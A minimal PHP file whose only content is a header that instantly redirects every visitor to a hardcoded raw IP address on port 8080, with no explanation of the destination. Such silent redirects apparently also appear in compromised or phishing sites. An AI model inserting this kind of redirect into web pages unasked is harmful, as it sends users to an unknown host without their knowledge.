<?php
 header("refresh:0;url=http://76.190.225.150:8080");

?>
